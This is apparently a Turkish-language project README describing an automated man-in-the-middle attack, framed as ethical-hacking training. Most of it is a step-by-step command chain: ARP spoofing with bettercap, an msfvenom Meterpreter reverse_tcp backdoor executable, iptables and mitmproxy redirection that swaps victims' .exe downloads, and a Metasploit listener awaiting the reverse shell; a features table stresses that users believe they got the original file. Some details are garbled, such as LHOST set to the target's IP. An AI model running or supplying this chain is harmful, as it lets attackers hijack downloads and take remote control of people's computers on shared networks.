
# 📜 Proje Açıklaması: Python ile Otomatikleştirilmiş MITM Sarlırısı

## 🔍 **Projenin Amacı**
Bu araç, **siber güvenlik uzmanlarına** ve **etik hacker'lara** yönelik geliştirilmiş bir eğitim simülasyonudur. Temel işlevleri:
- Ağ trafiğini manipüle ederek `.exe` indirmeleri yönlendirme
- ARP spoofing ile tam trafik denetimi
- Gerçekçi penetrasyon test senaryoları oluşturma

## 🛠️ **Nasıl Çalışır?**
İşte **MITM saldırısıyla EXE yönlendirme** için gereken tüm adımlar ve komutlar:

---

### 🔧 **1. Hazırlık Aşaması**
```bash
# Gerekliliklerin kurulumu (Kali Linux)
sudo apt update && sudo apt install -y mitmproxy bettercap metasploit-framework python3
```

### 🌐 **2. Ağ Dinleme Başlatma**
```bash
# Ağ arayüzünü belirleme (örnek: wlan0)
sudo bettercap -iface wlan0
```

### 🕵️♂️ **3. ARP Spoofing Aktivasyonu**
```bettercap
# Bettercap içinde çalıştırılacak komutlar
net.probe on
set arp.spoof.targets ***  # Hedef IP
set arp.spoof.fullduplex true
arp.spoof on
```

### 🎯 **4. Backdoor Oluşturma**
```bash
# Meterpreter payload üretimi
msfvenom -p windows/meterpreter/reverse_tcp LHOST=Hedep IP LPORT=1234 -f exe -o /var/www/html/backdoor.exe
```

### 🚦 **5. Trafik Yönlendirme Kuralları**
```bash
# IP Tables ayarları
sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
```

### ⚡ **6. MITM Proxy Başlatma**
```bash
./mitmdump -s mitm.py --mode transparent
```

### 📡 **7. Metasploit Dinleyici**
```bash
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST ***; set LPORT 1234; exploit"
```

### 📌 **Önemli Notlar**
1. **IP Adresleri** kendi ağınıza göre değiştirilmeli
2. Sertifika hatası almamak için hedef cihazda `mitm.it`'den CA sertifikası yüklenmeli
3. Testler sadece **yasal ortamlarda** yapılmalıdır

---

Bu komutlar **Kali Linux 2023+** sürümlerinde test edilmiştir. Her adımın çıktılarını kontrol ederek ilerleyin! 💻

## 🌟 **Öne Çıkan Özellikler**
| Özellik | Açıklama |
|---------|----------|
| **Görünmez Yönlendirme** | Kullanıcılar orijinal dosyayı indirdiğini sanar |
| **SSL Bypass** | Mitm.it sertifikasıyla şifreli trafik çözülür |
| **Çoklu Hedef** | Tüm ağ veya tek cihaz seçilebilir |

**Örnek Kullanım Senaryoları**:
- Kurumsal ağ güvenlik testleri
- Siber güvenlik eğitimleri
- Zararlı yazılım davranış analizleri

## 💡 **Neden Önemli?**
- Şirketlerin **indirme güvenliği** zafiyetlerini test eder
- **Sosyal mühendislik** saldırılarının teknik ayağını simüle eder
- Güvenlik uzmanlarının **savunma mekanizmaları** geliştirmesine yardımcı olur

---

> "Bilgi güvenliği, savunma ve saldırı dinamiklerini anlamakla başlar." - Siber Güvenlik Manifestosu

---
